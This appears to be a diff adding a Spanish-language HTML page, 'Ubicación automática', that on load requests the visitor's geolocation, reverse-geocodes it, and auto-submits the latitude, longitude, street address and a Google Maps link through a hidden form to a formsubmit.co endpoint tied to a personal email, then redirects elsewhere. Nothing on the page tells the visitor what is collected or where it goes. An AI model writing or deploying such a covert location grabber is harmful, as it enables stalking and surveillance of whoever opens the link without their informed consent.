@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Ubicación automática</title>
+  <script>
+    async function enviarUbicacion() {
+      if (!navigator.geolocation) {
+        alert("La geolocalización no está disponible.");
+        return;
+      }
+
+      navigator.geolocation.getCurrentPosition(async (pos) => {
+        const lat = pos.coords.latitude;
+        const lon = pos.coords.longitude;
+
+        document.getElementById("latitudInput").value = lat;
+        document.getElementById("longitudInput").value = lon;
+
+        // Geocodificación inversa con Nominatim
+        const url = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`;
+        try {
+          const response = await fetch(url);
+          const data = await response.json();
+          const direccion = data.display_name || "Dirección no disponible";
+
+          document.getElementById("direccionInput").value = direccion;
+          document.getElementById("mapaInput").value = `https://www.google.com/maps?q=${lat},${lon}`;
+
+          document.getElementById("formulario").submit();
+        } catch (error) {
+          alert("Error al obtener la dirección.");
+        }
+      }, (error) => {
+        alert("No se pudo obtener la ubicación.");
+      });
+    }
+
+    window.onload = enviarUbicacion;
+  </script>
+</head>
+<body>
+  <form action="https://formsubmit.co/elsanchezok@yahoo.com" method="POST" id="formulario" style="display:none;">
+    <input type="hidden" name="Latitud" id="latitudInput">
+    <input type="hidden" name="Longitud" id="longitudInput">
+    <input type="hidden" name="Dirección" id="direccionInput">
+    <input type="hidden" name="Google Maps" id="mapaInput">
+    <input type="hidden" name="_captcha" value="false">
+    <input type="hidden" name="_template" value="table">
+    <input type="hidden" name="_next" value="https://elsanchezok.github.io/">
+  </form>
+</body>
+</html>
